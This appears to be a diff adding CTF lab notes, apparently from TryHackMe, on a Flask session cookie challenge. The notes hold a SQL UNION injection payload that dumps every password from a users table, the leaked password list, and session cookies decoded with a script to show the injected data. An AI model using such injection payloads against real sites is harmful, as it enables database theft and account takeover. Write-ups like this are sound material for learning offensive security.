@@ -187,3 +187,45 @@ THM{f35f47dcd9d596f0d3860d14cd4c68ec}
 
 ![[Pasted image 20230706221958.png]]
 
+**07072023Fri**
+
+https://www.kirsle.net/wizards/flask-session.cgi
+
+http://10.10.142.195:5000/challenge2/home
+
+![[Pasted image 20230707060305.png]]
+
+![[Pasted image 20230707060742.png]]
+
+![[Pasted image 20230707061003.png]]
+
+```
+' UNION SELECT 1,group_concat(password) FROM users-- -
+```
+
+rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123
+
+```
+THM{fb381dfee71ef9c31b93625ad540c9fa}
+```
+
+![[Pasted image 20230707061501.png]]
+
+![[Pasted image 20230707061641.png]]
+
+```
+python3 decode_cookie.py .eJyrVkrOSMzJSc1LTzWKLy1OLYrPTFGyMtRBF85LzE1VslJKTMnNzFOqBQAYpRNS.ZKdO6A.dOUoVKmnRFc9xlIl60YfJg5uoIs
+{
+    "challenge2_user_id": 1,
+    "challenge2_username": "admin"
+}
+```
+
+```
+python3 decode_cookie.py .eJxdyLsOwiAUANBvkZmhcEGlm-lQBnXxFaeGwqVFS03AGpOm_-7uGc9MbG-GAccOeTNlTE1wpGT0v0cTkZQk2f39pqsv1pe8U28N9fFKTXb0NMWIiRdMrSgIGSG8RP8AetaH2bewZc4jbhh6ZYG1CtZcGidFYZU3C_2EZxg7xoEsP-x5LwI.ZKdRdA.KvIZbyBOgx9nF2nHAZBmCbLJTjc
+{
+    "challenge2_user_id": 1,
+    "challenge2_username": "rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123"
+}
+```
+
